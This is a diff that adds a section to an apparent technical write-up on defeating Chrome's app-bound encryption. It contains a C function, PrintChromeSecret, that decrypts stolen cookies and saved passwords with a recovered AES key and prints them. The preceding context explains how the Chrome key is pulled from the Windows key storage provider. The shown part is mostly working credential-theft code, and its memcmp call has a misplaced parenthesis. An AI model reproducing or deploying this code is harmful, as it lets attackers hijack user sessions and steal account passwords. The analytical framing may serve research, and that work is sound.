@@ -779,3 +779,50 @@ BOOLEAN DecryptUsingChromeKey(_In_ PUCHAR Ciphertext)
 
 
 --> `This function uses Windows CNG APIs to retrieve the Chrome-specific key (Google Chromekey1) from the Microsoft Software Key Storage Provider and uses it to decrypt a 32-byte app-bound encrypted key in-place. This step effectively recovers the raw AES key used by Chrome to protect sensitive data such as cookies and saved passwords.`
+
+### PrintChromeSecret
+
+```php
+VOID PrintChromeSecret(_In_ PUCHAR AppBoundKey, _In_ UCHAR Type, _In_ PUCHAR Data, _In_ ULONG DataSize)
+{
+    PUCHAR Ciphertext;
+    ULONG  CiphertextLength;
+    PUCHAR Nonce; 
+    PUCHAR Tag;   
+
+    
+
+    if (memcmp(Data, SecretVersion, sizeof(SecretVersion) != 0))
+    {
+        wprintf(L"Unsupported Chrome version\n");
+        return;
+    }
+
+    
+
+    Nonce = Data + sizeof(SecretVersion);
+
+   
+
+    Tag = Data + DataSize - 16;
+
+    
+
+    Ciphertext = Data + sizeof(SecretVersion) + 12;
+    CiphertextLength = DataSize - (sizeof(SecretVersion) + 12 + 16);
+
+    
+
+    if (Aes256GcmDecrypt(AppBoundKey, 32, Nonce, 12, Tag, 16, Ciphertext, CiphertextLength) == TRUE)
+    {
+        if (Type == COOKIE)
+        {
+            wprintf(L"- Cookie: %.*hS\n\n", CiphertextLength - 32, Ciphertext + 32);
+        }
+        else if (Type == SAVED_LOGIN)
+        {
+            wprintf(L"- Password: %.*hS\n\n", CiphertextLength, Ciphertext);
+        }
+    }
+}
+```
